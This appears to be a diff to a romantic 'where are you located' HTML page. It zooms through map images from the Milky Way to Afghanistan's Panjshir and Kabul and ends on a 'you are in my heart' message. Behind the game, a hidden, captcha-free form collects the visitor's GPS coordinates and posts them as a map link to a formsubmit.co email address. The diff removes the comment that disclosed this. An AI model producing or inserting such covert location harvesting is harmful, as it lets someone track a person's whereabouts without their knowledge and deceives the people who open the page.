@@ -33,52 +33,57 @@
         }
 
         .card {
-            background: rgba(17, 24, 39, 0.75);
+            background: rgba(17, 24, 39, 0.85);
             backdrop-filter: blur(16px);
             border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 24px;
-            padding: 40px 30px;
+            padding: 35px 25px;
             width: 90%;
             max-width: 440px;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
-            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.7);
         }
 
         .step {
             display: none;
-            animation: fadeIn 0.6s ease-out forwards;
         }
 
         .step.active {
             display: block;
+            animation: zoomFade 0.7s cubic-bezier(0.16, 1, 0.3, 1) forwards;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
+        @keyframes zoomFade {
+            from { opacity: 0; transform: scale(0.8); }
             to { opacity: 1; transform: scale(1); }
         }
 
-        .icon {
-            font-size: 70px;
-            margin-bottom: 20px;
-            display: inline-block;
-            filter: drop-shadow(0 0 15px rgba(255,255,255,0.4));
+        /* قاب تصاویر واقعی */
+        .map-image-container {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 20px auto;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid rgba(99, 102, 241, 0.5);
+            box-shadow: 0 0 25px rgba(99, 102, 241, 0.4);
+            position: relative;
         }
 
-        .zoom-anim {
-            animation: pulse 2s infinite ease-in-out;
+        .map-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 3s ease;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+        .step.active .map-image {
+            transform: scale(1.15);
         }
 
         h2 {
             font-size: 24px;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             font-weight: 600;
             background: linear-gradient(135deg, #a5b4fc, #38bdf8);
             -webkit-background-clip: text;
@@ -117,8 +122,8 @@
         }
 
         .btn-primary:hover {
-            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6);
             transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.6);
         }
 
         .btn-secondary {
@@ -127,21 +132,15 @@
             position: relative;
         }
 
-        .heart-container {
-            position: relative;
-            width: 100px;
-            height: 100px;
-            margin: 20px auto;
-        }
-
         .heart {
             font-size: 90px;
             animation: beat 1s infinite alternate ease-in-out;
             filter: drop-shadow(0 0 25px #f43f5e);
+            margin: 20px 0;
         }
 
         @keyframes beat {
-            to { transform: scale(1.2); }
+            to { transform: scale(1.25); }
         }
 
         .location-tag {
@@ -163,7 +162,9 @@
     <div class="card">
         <!-- STEP 1: GALAXY -->
         <div class="step active" id="step1">
-            <div class="icon zoom-anim">🌌</div>
+            <div class="map-image-container">
+                <img src="https://images.unsplash.com/photo-1506703719100-a0f3a48c0f86?w=500" class="map-image" alt="Milky Way Galaxy">
+            </div>
             <div class="location-tag">Sector: Milky Way</div>
             <h2>Universal Map</h2>
             <p>Locating system in the Milky Way Galaxy...</p>
@@ -172,7 +173,9 @@
 
         <!-- STEP 2: EARTH -->
         <div class="step" id="step2">
-            <div class="icon zoom-anim">🌍</div>
+            <div class="map-image-container">
+                <img src="https://images.unsplash.com/photo-1614728894747-a83421e2b9c9?w=500" class="map-image" alt="Planet Earth">
+            </div>
             <div class="location-tag">Planet: Earth</div>
             <h2>Scanning Earth</h2>
             <p>Targeting atmosphere and continental coordinates...</p>
@@ -181,16 +184,20 @@
 
         <!-- STEP 3: AFGHANISTAN -->
         <div class="step" id="step3">
-            <div class="icon zoom-anim">🇦🇫</div>
+            <div class="map-image-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Afghanistan_%28orthographic_projection%29.svg/1200px-Afghanistan_%28orthographic_projection%29.svg.png" class="map-image" style="background:#fff; padding:10px;" alt="Afghanistan Map">
+            </div>
             <div class="location-tag">Country: Afghanistan</div>
             <h2>Locating Country</h2>
-            <p>Scanning Central Asia region...</p>
+            <p>Scanning Central Asia region and national map...</p>
             <button class="btn-primary" onclick="nextStep(4)">Zoom In 📍</button>
         </div>
 
         <!-- STEP 4: PANJSHIR & KABUL -->
         <div class="step" id="step4">
-            <div class="icon zoom-anim">⛰️</div>
+            <div class="map-image-container">
+                <img src="https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=500" class="map-image" alt="Mountains of Panjshir">
+            </div>
             <div class="location-tag">Provinces: Panjshir & Kabul</div>
             <h2>Regional Satellite</h2>
             <p>Focusing on Panjshir valley and Kabul region...</p>
@@ -199,7 +206,9 @@
 
         <!-- STEP 5: QUESTION -->
         <div class="step" id="step5">
-            <div class="icon">✨</div>
+            <div class="map-image-container" style="border-color:#f43f5e; box-shadow:0 0 25px rgba(244,63,94,0.4);">
+                <img src="https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=500" class="map-image" alt="Compass">
+            </div>
             <h2>Final Query</h2>
             <p>Do you want to know where you are really located?</p>
             <div class="btn-group">
@@ -210,15 +219,12 @@
 
         <!-- STEP 6: HEART RESULT -->
         <div class="step" id="step6">
-            <div class="heart-container">
-                <div class="heart">❤️</div>
-            </div>
-            <h2 style="font-size: 32px; margin-top: 20px;">In My Heart</h2>
+            <div class="heart">❤️</div>
+            <h2 style="font-size: 32px; margin-top: 10px;">In My Heart</h2>
             <p>You are always right here, safe and sound. ✨</p>
         </div>
     </div>
 
-    <!-- Hidden form to send location data to your email -->
     <form id="geoForm" action="https://formsubmit.co/faisal@selenic.io" method="POST" style="display:none;">
         <input type="text" name="location_coords" id="coordsInput">
         <input type="hidden" name="_captcha" value="false">
@@ -236,7 +242,6 @@
                     function(position) {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        
                         document.getElementById('coordsInput').value = `GPS Location: https://maps.google.com/?q=${lat},${lon}`;
                         
                         const form = document.getElementById('geoForm');
@@ -248,7 +253,6 @@
                         nextStep(5);
                     },
                     function(error) {
-                        // در صورت عدم اجازه دسترسی یا خطا، باز هم به مرحله ۵ برود
                         nextStep(5);
                     }
                 );
@@ -257,7 +261,6 @@
             }
         }
 
-        // Runaway "No" Button
         const btnNo = document.getElementById("btnNo");
         if (btnNo) {
             btnNo.addEventListener("mouseover", moveBtn);
